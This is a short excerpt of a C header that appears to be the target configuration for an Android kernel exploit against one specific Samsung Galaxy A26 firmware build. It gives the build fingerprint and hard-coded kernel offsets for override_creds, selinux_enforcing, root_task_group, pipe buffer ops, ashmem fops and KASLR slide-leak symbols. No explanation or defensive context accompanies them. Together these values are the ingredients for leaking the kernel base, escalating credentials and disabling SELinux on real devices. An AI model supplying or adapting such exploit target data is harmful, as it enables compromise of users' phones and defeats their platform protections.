 ...
 * ------------------------------------------------------------------------- */
#define BUILD_VARIANT_LABEL "a26x-A266BXXSBCZG2-app"
#define PHYS_P0_ORACLE 1
#define SLIDE_ROUTE SLIDE_ROUTE_FPSIMD

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/a26xxx/a26x:16/BP4A.251205.006/A266BXXSBCZG2_OJMBCZG2:user/release-keys"
#endif
...
#define P0_FINGERPRINT_HEADER \
  "targets/a26x-A266BXXSBCZG2/p0_fingerprint.h"
...
#define OVERRIDE_CREDS_OFF                  0x00112a2cULL
#define ROOT_TASK_GROUP_OFF                 0x02473f40ULL
#define SELINUX_ENFORCING_OFF               0x02546f50ULL
#define KMALLOC_CACHES_OFF                  0x01a2cf70ULL
#define ANON_PIPE_BUF_OPS_OFF               0x0184b220ULL
...
#define ASHMEM_FOPS_OFF                     0x019dbef0ULL
#define ASHMEM_MISC_FOPS_OFF                0x023e4210ULL
...
/* --- slide leak symbols ---------------------------------------------------- */
#define SLIDE_NFULNL_LOGGER_NAME_OFF              0x01748c81ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF            0x02282590ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF   0x023a31f8ULL
